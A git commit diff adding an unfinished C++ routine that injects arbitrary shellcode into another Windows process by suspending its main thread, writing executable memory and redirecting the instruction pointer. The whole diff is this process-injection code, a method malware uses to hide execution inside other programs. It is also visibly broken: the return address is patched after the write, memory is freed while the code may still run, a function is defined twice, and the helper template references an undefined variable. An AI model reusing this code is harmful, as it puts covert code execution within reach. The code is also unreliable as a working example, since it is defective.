c5cd28650a70e80d2e8ddec84648d48805e339dc
bruno <humic.bruno@gmail.com>
2018-09-13 17:29:15 +0200

    work in progress on refactoring the main thread hijack method

--- header/inject.cpp
+++ header/inject.cpp
@@ -206,3 +206,89 @@ void injector_t::inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std:
         return;
     }
 }
+
+void injector_t::inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode)
+{
+
+    std::vector<BYTE> prologue = { 0x60, 0x9c }; // pushal; pushfd
+    std::vector<BYTE> epilogue = { 0x9d, 0x61 }; // popfd; popal
+    std::vector<BYTE> un_hijack = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 }; // push originaEIP; retn
+
+    // prepare shellcode for this method
+    shellcode.insert(shellcode.begin(), prologue.begin(), prologue.end());
+    shellcode.insert(shellcode.end(), epilogue.begin(), epilogue.end());
+    shellcode.insert(shellcode.end(), un_hijack.begin(), un_hijack.end());
+
+    // obtain the handle to the main thread
+    HANDLE main_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, process_info.tid);
+    if (main_thread == NULL)
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // suspend the main thread before hijacking
+    DWORD suspend_count = SuspendThread(main_thread);
+    if (suspend_count == (DWORD)-1)
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // allocate memory for the shellcode
+    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (allocated == NULL)
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // injecting the shellcode into the process
+    SIZE_T bytes_written;
+    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // obtain the context of main thread
+    WOW64_CONTEXT context;
+    context.ContextFlags = WOW64_CONTEXT_CONTROL;
+    if (Wow64GetThreadContext(main_thread, &context))
+    {
+        // restore the previous entry point
+        shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Eip;
+        shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Eip >> 8);
+        shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Eip >> 16);
+        shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Eip >> 24);
+    }
+    else
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // modify thread context to execute the shellcode
+    context.Eip = (DWORD)allocated;
+    context.ContextFlags = WOW64_CONTEXT_CONTROL;
+    if (!Wow64SetThreadContext(main_thread, &context))
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // resume the main thread
+    if (ResumeThread(main_thread) == (DWORD)-1)
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // close the handle to main thread and free the memory
+    CloseHandle(main_thread);
+    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
+    {
+        print_error(GetLastError());
+        return;
+    }
+}
--- header/inject.h
+++ header/inject.h
@@ -13,4 +13,37 @@ public:
     void inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);
     // inject shellcode into a process described with PROCESS_INFO and execute it via Main Thread Hijacking method (x86)
     void inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);
+    // inject shellcode into a process described with PROCESS_INFO and execute it via Main Thread Hijacking method
+    void inject_shellcode_mth(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);
+
+private:
+    template <typename CONTEXT, typename CONTEXT_FLAGS, typename get_thread_context, typename addr_type, typename set_thread_context>
+    boolean adjust_thread_context(const HANDLE& main_thread, std::vector<BYTE>& shellcode, addr_type address, get_thread_context gtc, set_thread_context stc)
+    {
+        // obtain the context of main thread
+        CONTEXT context;
+        context.ContextFlags = CONTEXT_FLAGS;
+        if (gtc(main_thread, &context))
+        {
+            // restore the previous entry point
+            shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Eip;
+            shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Eip >> 8);
+            shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Eip >> 16);
+            shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Eip >> 24);
+        }
+        else
+        {
+            print_error(GetLastError());
+            return;
+        }
+
+        // modify thread context to execute the shellcode
+        context.Eip = (DWORD)allocated;
+        context.ContextFlags = WOW64_CONTEXT_CONTROL;
+        if (!Wow64SetThreadContext(main_thread, &context))
+        {
+            print_error(GetLastError());
+            return;
+        }
+    }
 };
